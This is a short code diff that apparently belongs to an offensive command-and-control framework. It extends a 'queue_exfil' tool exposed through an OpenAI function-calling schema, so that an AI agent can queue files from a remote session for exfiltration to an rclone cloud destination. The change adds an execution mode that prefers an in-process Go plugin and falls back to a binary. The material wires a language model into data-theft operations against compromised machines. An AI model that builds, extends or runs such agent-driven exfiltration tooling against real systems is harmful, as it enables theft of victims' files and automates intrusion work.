@@ -195,11 +195,12 @@ def tool_queue_exfil(
     remote_path: str,
     profile: str | None = None,
     dest: str | None = None,
+    mode: str = "auto",
 ) -> str:
     sid, _ = _resolve_session_id(client, session_ref)
     if not sid:
         return _json_result({"ok": False, "error": "session_not_found"})
-    code, data = client.queue_exfil(sid, remote_path, profile=profile, dest=dest)
+    code, data = client.queue_exfil(sid, remote_path, profile=profile, dest=dest, mode=mode)
     return _json_result({
         "ok": code == 200,
         "status": code,
@@ -657,6 +658,7 @@ OPENAI_TOOLS: list[dict] = [
                     "remote_path": {"type": "string"},
                     "profile": {"type": "string", "description": "Named rclone profile on server"},
                     "dest": {"type": "string", "description": "Optional cloud destination path"},
+                    "mode": {"type": "string", "enum": ["auto", "plugin", "binary"], "description": "Execution mode; auto prefers the in-process Go plugin and falls back to the binary"},
                 },
                 "required": ["session_ref", "remote_path"],
             },
